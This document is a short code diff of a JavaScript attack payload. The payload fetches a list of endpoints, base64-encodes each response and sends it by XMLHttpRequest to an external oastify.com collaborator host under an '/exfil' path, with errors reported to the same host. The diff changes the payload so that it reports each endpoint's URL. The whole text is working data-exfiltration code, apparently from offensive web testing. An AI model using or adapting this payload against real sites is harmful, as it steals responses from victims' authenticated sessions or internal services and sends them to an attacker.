@@ -18,11 +18,11 @@ for (var i = 0; i < endpoints.length; i++) {
     r.send();
     var encoded = r.responseText ? btoa(unescape(encodeURIComponent(r.responseText))) : 'empty';
     var x = new window.XMLHttpRequest();
-    x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?ep=' + i + '&d=' + encoded, false);
+    x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?ep=' + encodeURIComponent(endpoints[i]) + '&d=' + encoded, false);
     x.send();
   } catch(e) {
     var xe = new window.XMLHttpRequest();
-    xe.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/error?ep=' + i + '&e=' + btoa(e.message), false);
+    xe.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/error?ep=' + encodeURIComponent(endpoints[i]) + '&e=' + btoa(e.message), false);
     xe.send();
   }
 }
